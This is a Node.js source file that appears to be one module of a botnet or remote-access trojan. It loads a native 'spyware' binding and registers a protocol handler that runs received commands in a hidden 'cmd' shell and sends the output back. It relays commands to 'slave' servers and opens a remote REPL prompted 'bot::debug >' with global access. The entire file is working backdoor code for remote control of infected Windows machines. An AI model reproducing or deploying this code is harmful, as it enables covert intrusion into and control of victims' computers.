var fs = require('fs');
var path = require('path');
var zlib = require('zlib');
var net = require('net');
var stream = require('stream');
var util = require('util');
var suspend = require('suspend');
var iconv = require('inconvlite');
var Stream = require('stream').Stream;
var repl = require('repl');
var protobuf = require('protocol_buffers');

var spyware = process.binding("spyware");
var reg = process.binding("registry");

var consoleTerminal = undefined;


var messages = protobuf([
  'message CommandExecutionRequest {\r',
    '\toptional string process = 1;\r',
    '\toptional string command = 2;\r',
  '}\r'
].join('\n'));

const SP_EXECUTECMD = 1;
const SP_EXECUTREPL = 2;

var MyPacketId;
var ReplCookie;


function createReplStream(socket) {
    var stream = new Stream();

    stream.readable = true;
    stream.resume = function () { };
    stream.write = function (data) {};

    return stream;
};


function getTerminalDefaultEncoding() {
    var x = new reg.WindowsRegistry(HKEY_LOCAL_MACHINE, 
    	'SYSTEM\\CurrentControlSet\\Control\\Nls\\CodePage\\',
    	KEY_READ, true);

    var valueType = x.GetDataType("OEMCP");

    if (valueType == REG_SZ) {
        return x.ReadString("OEMCP");
    }
}

function BuildPacket(requestId, status, data)
{
	var packet;

	if(data){
		packet = new Buffer(
			2  +
			4  +
			1  +
			data.length
		);
	}
	else
	{
		packet = new Buffer(
			2  +
			4  +
			1 
		);
	}
	
	packet.writeUInt16BE(MyPacketId, 0);
	packet.writeUInt32BE(requestId, 2);
	packet.writeUInt8(status, 6);

	if(data)
		data.copy(packet, 7);

	return packet;
}

var OnPacket = suspend(function*(outstream, data) 
{
	
	var func = data.readUInt8();
	var requestId = data.readUInt32BE(1);

	
	
	

	
	{
		switch(func)
		{
			case SP_EXECUTECMD :
				var command = messages.CommandExecutionRequest.decode(data.slice(5));
				var commandForExecute = command.command;
				
				
				

				if(command.process === process.currentBinary){
				    if (typeof (consoleTerminal) == 'undefined') {
				        consoleTerminal = require('child_process').spawn('cmd');
				        consoleTerminal.encoding = getTerminalDefaultEncoding();

				        if (consoleTerminal.encoding) {
				            consoleTerminal.encoding = 'cp' + consoleTerminal.encoding;
				        }

				        consoleTerminal.stdout.on('data', function (data) {
				            var dataForSend = new Buffer(iconv.decode(data, consoleTerminal.encoding));
				            outstream.sendProtocolPacket(
                                MyPacketId, requestId, 0x00, dataForSend);
				        });

				        consoleTerminal.stderr.on('data', function (data) {
				            var dataForSend = new Buffer(iconv.decode(data, consoleTerminal.encoding));
						
				            outstream.sendProtocolPacket(
                                MyPacketId, requestId, 0x00, dataForSend);
				        });

				        consoleTerminal.on('close', function(){
				            consoleTerminal = undefined;
				        })
				    }

				    if(consoleTerminal)
				        consoleTerminal.stdin.write(
                            iconv.encode(commandForExecute, consoleTerminal.encoding));
				}
				else
				{
				    if(process.slaveServer)
    				    process.slaveServer.broadcastProtocolPacket(
                            MyPacketId, data);
				}

				break;
			case SP_EXECUTREPL :
				
			    var command = messages.CommandExecutionRequest.decode(data.slice(5));
			    if(command.process === process.currentBinary){
			        var commandForExecute = command.command;

			        if(ReplCookie !== requestId)
			        {
			            ReplCookie = requestId;

			            process.g_ReplStream.write = function (stdout_data) {
			                outstream.sendProtocolPacket(
                                MyPacketId, requestId, 0x00, new Buffer(stdout_data));
			            };
			        }
			    
			        process.g_ReplStream.emit('data', commandForExecute);
			    }
			    else
			    {
			        if(!util.isUndefined(process.slaveServer)){
			            process.slaveServer.broadcastProtocolPacket(
                            MyPacketId, data);
			        }
			    }
				break;
			default:
				outstream.sendProtocolPacket(
					MyPacketId, requestId, 0xFF);
				break;	
		}

	}

});

exports.register = function (prtocolId, packetParsers, procolPacketBuilders) {
	

	MyPacketId = prtocolId;


	packetParsers[prtocolId] = OnPacket;
	procolPacketBuilders[prtocolId] = BuildPacket;
	process.g_ReplStream = createReplStream();

	process.g_replInstance = repl.start({
	    prompt: "bot::debug > ",
	    input: process.g_ReplStream,
	    output: process.g_ReplStream,
	    useGlobal: true
	});

	process.g_replInstance.context.printf = function () {
        var s = util.format.apply(this, arguments) + '\n';
        process.g_ReplStream.write(s);
    }
}